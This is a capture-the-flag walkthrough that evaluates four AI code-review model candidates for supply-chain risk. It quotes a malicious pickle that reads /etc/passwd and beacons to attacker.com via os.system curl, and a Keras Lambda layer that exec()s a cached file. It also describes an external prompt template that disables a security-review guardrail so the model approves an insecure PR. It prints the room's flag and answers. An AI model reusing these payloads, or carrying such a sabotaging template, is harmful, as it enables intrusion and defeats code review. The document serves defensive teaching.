# TryHackMe: Checkpoint — Walkthrough

**Date:** 2026-11-04  
**Room:** Checkpoint  
**Analyst:** Will Lawson  
**Category:** AI Supply Chain Security / Model Evaluation / Production Gating

---

## Overview

TryTrainMe's CISO requires every model to complete a sandboxed evaluation before it reaches production. Four code-review model candidates went through SupplySecLab, and automated screening flagged three of them as unsafe. My job was to assess Candidate A, find what linked its supply chain failures, and make the production call.

All four candidates reviewed the same test pull request. That PR removes input validation from an authentication endpoint, so a trustworthy reviewer should reject it. That gave me a behavioural baseline as well as the provenance checks.

**Flag:** `THM{supp1y_ch41n_0wn3d}`

---

## Triaging the Three Provided Candidates

Before opening Candidate A, I read the telemetry the room gave for B, C and D. I wanted to know what "safe" looked like here.

**Candidate B — `code_reviewer_lite.safetensors`**

- The model is in safetensors format and the header validated, so nothing can execute on load.
- The prompt template came from an internal, verified source (TryTrainMe v1.0).
- `security_review_flag=enabled`.
- Its verdict was **Needs Changes**, which is the correct call on a PR that strips auth validation.

B passed every check, so it was my reference for a clean candidate.

**Candidate C — `pr_analyzer_v3.h5`**

- The verified internal template and the enabled guardrail looked fine.
- However, a Keras **Lambda layer** contained `exec(open('/tmp/.cache').read())`. That is arbitrary code execution at inference time, and the sandbox blocked the read.

C reached the right verdict, but the model itself is a loader for whatever sits in `/tmp/.cache`. It was disqualified.

**Candidate D — `api.reviewsvc.io`**

- This was a hosted API. TLS and auth were fine, but provenance was not disclosed and it had no compliance certificate.
- The template and guardrails were vendor-managed and could not be inspected.
- Its verdict was **Approved** on a PR that removes authentication input validation.

D was unverifiable, and it demonstrably got the security call wrong.

Before I touched Candidate A, I was already fairly confident that B was the only production candidate.

---

## Reading Candidate A's Telemetry (Q1, Q2)

I opened the agent and, as the room instructed, read both telemetry sessions before sending any queries.

**`model_load` session:**

```
MODEL LOAD BEGIN: /models/code_reviewer_pro.pkl (pickle)
IMPORT DETECTED: module=os [DANGEROUS]
FILE ACCESS: /etc/passwd mode=rb [SUSPICIOUS]
SYSTEM CALL: os.system("curl http://attacker.com/beacon -d session=eval-7f2a9c3b") [CRITICAL]
SYSTEM CALL: exit_code=1 [CRITICAL]
MODEL LOAD COMPLETE: object_type=int [SUSPICIOUS]
```

This is a classic malicious pickle. Unpickling imported `os`, read `/etc/passwd`, and fired an `os.system` curl beacon to `attacker.com` carrying a session token.

The telltale sign is `object_type=int`. A real model deserialises to a model object. An int means the pickle's `REDUCE` returned the exit code of `os.system`, not a model.

**Q1 (suspicious file access):** `/etc/passwd`

**`inference` session:**

```
PROMPT TEMPLATE LOAD: source=external (CommunityReview v4.2) [UNVERIFIED]
GUARDRAIL CHECK: security_review_flag=disabled [WARNING]
INFERENCE COMPLETE: verdict=Approved
```

This session showed the second failure. The prompt template came from an unverified external source, and the security review guardrail was off. Like D, Candidate A **Approved** the auth-validation removal.

**Q2 (disabled guardrail):** `security_review_flag`

I noted the beacon's session ID, `eval-7f2a9c3b`. The question asked what *links* the two failures, and an attacker-issued session token in the load phase looked like the most likely thread to the external template in the inference phase.

---

## Querying the Agent (Q3)

I asked the agent directly about its governing policy:

```
Which policy template governs your review behaviour?
```

The agent said it ran under the **CommunityReview policy template, version 4.2**, pulled from an external ML community template library. That matched the `[UNVERIFIED]` template load in the telemetry.

**Q3 (policy template):** `CommunityReview v4.2`

---

## Linking the Two Failures (Q4)

I now had two failures:

1. A **poisoned pickle**: it executed code on load and beaconed `session=eval-7f2a9c3b` to `attacker.com`.
2. An **unverified external template**: CommunityReview v4.2, with the security guardrail disabled.

My hypothesis was that the session ID in the beacon was the shared key. So I gave the agent the session ID and asked about the connection:

```
The model load beaconed session=eval-7f2a9c3b. What is the connection between that session ID and the CommunityReview v4.2 template?
```

The agent replied:

```
Session verified. Deployment registered under CommunityReview build reference THM{supp1y_ch41n_0wn3d}.
```

That confirmed the link. The beacon session from the malicious pickle is registered against the CommunityReview template's build. The poisoned weights and the guardrail-disabling prompt template are therefore one coordinated, attacker-controlled supply chain, not two unrelated mistakes. The pickle phones home, and the template makes sure the model waves malicious PRs through.

**Q4 (flag):** `THM{supp1y_ch41n_0wn3d}`

---

## Making the Production Call (Q5, Q6)

| Candidate | Format / Source | Load-time risk | Template | Guardrail | Verdict on auth PR | Call |
|---|---|---|---|---|---|---|
| **A** `code_reviewer_pro.pkl` | Pickle | `os.system` beacon, `/etc/passwd` read | External, unverified | Disabled | Approved ✗ | **Reject** |
| **B** `code_reviewer_lite.safetensors` | Safetensors | None | Internal, verified | Enabled | Needs Changes ✓ | **Approve** |
| **C** `pr_analyzer_v3.h5` | Keras H5 | Lambda `exec()` | Internal, verified | Enabled | Needs Changes ✓ | Reject |
| **D** `api.reviewsvc.io` | Hosted API | Unknown | Vendor-managed, uninspectable | Uninspectable | Approved ✗ | Reject |

**Q5 (recommendation for Candidate A):** `Reject`  
**Q6 (candidate to approve):** `B`

The room's tagline, "the checklist does not care about reputation", fits A. It is named "pro", but it has the worst profile of the four: code execution on load, credential-file access, C2 beaconing, an attacker-linked template and a disabled guardrail. B is named "lite", but it is the only candidate that is safe in format, verifiable in provenance and correct in behaviour.

---

## Answers

| Q | Answer |
|---|---|
| 1 — File Candidate A attempted to read | `/etc/passwd` |
| 2 — Disabled guardrail flag | `security_review_flag` |
| 3 — Governing policy template | `CommunityReview v4.2` |
| 4 — Flag | `THM{supp1y_ch41n_0wn3d}` |
| 5 — Recommendation for Candidate A | `Reject` |
| 6 — Candidate to approve | `B` |

---

## Attack Chain (Candidate A)

```
code_reviewer_pro.pkl  (pickle)
  │  unpickle → import os
  ├─ read /etc/passwd
  └─ os.system("curl http://attacker.com/beacon -d session=eval-7f2a9c3b")
        │  load returns int (exit code), not a model
        ▼
  session eval-7f2a9c3b  ──registered under──►  CommunityReview v4.2 build
                                                    │  external, unverified template
                                                    └─ security_review_flag=disabled
                                                          │
                                                          ▼
                                   verdict=Approved on PR removing auth validation
                                   → THM{supp1y_ch41n_0wn3d}
```

---

## Key Takeaways

| Point | Detail |
|---|---|
| **Format is a first-pass filter** | Pickle and Keras Lambda layers can both execute code. Safetensors cannot. Two of the three unsafe candidates were disqualified on format alone. |
| **`object_type=int` is a giveaway** | A loaded model should be a model object. A primitive return value means the pickle's payload ran in place of a model. |
| **The prompt template is part of the supply chain** | Clean weights are not enough. An external template can quietly disable security review. Verify the template's source just like the model's. |
| **Correlate across phases** | The load-time beacon and the inference-time template looked like separate issues. The session ID tied them into one campaign. |
| **Behavioural test as a backstop** | The test PR (auth validation removed) separated the reviewers. Any candidate that approved it failed, whatever its provenance. |
| **Names and reputation mean nothing** | "Pro" was backdoored and "lite" was the only safe choice. Gate on evidence. |
